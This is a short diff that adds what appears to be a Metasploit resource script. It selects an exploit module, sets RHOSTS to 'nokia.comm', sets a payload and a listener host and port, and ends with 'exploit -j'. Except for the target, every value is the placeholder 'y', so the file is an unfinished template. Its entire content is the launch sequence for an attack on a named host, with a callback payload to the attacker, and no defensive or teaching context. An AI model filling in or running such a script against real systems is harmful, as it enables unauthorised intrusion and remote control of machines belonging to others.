@@ -1,0 +1,7 @@
+use y
+set RHOSTS nokia.comm
+set RPORT y
+set PAYLOAD y
+set LHOST y
+set LPORT y
+exploit -j
